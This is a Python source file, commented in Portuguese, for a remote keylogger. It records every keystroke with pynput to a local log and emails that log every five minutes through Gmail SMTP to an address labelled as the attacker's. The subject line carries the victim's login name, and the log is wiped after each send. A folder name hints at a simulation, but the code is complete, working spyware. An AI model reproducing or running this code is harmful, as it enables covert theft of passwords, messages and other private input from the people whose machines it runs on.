import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Timer
from pynput import keyboard
import os
import time

# =======================================================================
# 1. Configurações de E-mail (SUBSTITUA ESTES VALORES!)
# Requer: Ativar o Acesso a Apps Menos Seguros ou usar Senha de Aplicativo
# =======================================================================
EMAIL_REMETENTE = "seu_email_aqui@gmail.com"        
SENHA_APP = "SUA_SENHA_DE_APP_AQUI"                 # EX: Senha de Aplicativo do Gmail (16 caracteres)
EMAIL_DESTINATARIO = "email_do_atacante@exemplo.com"
INTERVALO_ENVIO = 300 # Tempo em segundos (5 minutos)
LOG_FILE = "keylogger_simulado/log.txt"

# =======================================================================
# 2. Keylogger Core (Lógica de Captura)
# =======================================================================
IGNORAR = [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.Key.caps_lock, keyboard.Key.cmd]

def on_press(key):
    """Função chamada a cada tecla pressionada para registro."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key in IGNORAR:
                pass 
            else:
                f.write(f" [{str(key).replace('Key.', '')}] ")

# =======================================================================
# 3. Função de Envio Remoto
# =======================================================================
def enviar_log():
    """Tenta enviar o log por e-mail e agenda o próximo ciclo."""
    
    # Agenda o próximo envio antes de executar o atual
    t = Timer(INTERVALO_ENVIO, enviar_log)
    t.start()
    
    if not os.path.exists(LOG_FILE): return

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_content = f.read()

    # Não envia se o log estiver vazio
    if not log_content.strip(): return

    # Constrói a mensagem de e-mail
    msg = MIMEMultipart()
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINATARIO
    msg['Subject'] = f"Keylog Report - Host: {os.getlogin()} - {time.ctime()}" # Adiciona o nome do usuário/host para rastreamento
    msg.attach(MIMEText(log_content, 'plain'))

    # Envia o e-mail via SMTP
    try:
        servidor = smtplib.SMTP('smtp.gmail.com', 587)
        servidor.starttls()
        servidor.login(EMAIL_REMETENTE, SENHA_APP)
        servidor.send_message(msg)
        servidor.quit()
        
        # Limpa o arquivo de log local após o envio bem-sucedido
        with open(LOG_FILE, "w") as f:
            f.write("")
            
    except Exception:
        # Mantém o log para tentar enviar no próximo ciclo, em caso de falha de conexão.
        pass

# =======================================================================
# 4. Execução Principal
# =======================================================================
if __name__ == "__main__":
    print(f"Keylogger Remoto iniciado. Log será enviado a cada {INTERVALO_ENVIO} segundos.")
    
    enviar_log()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()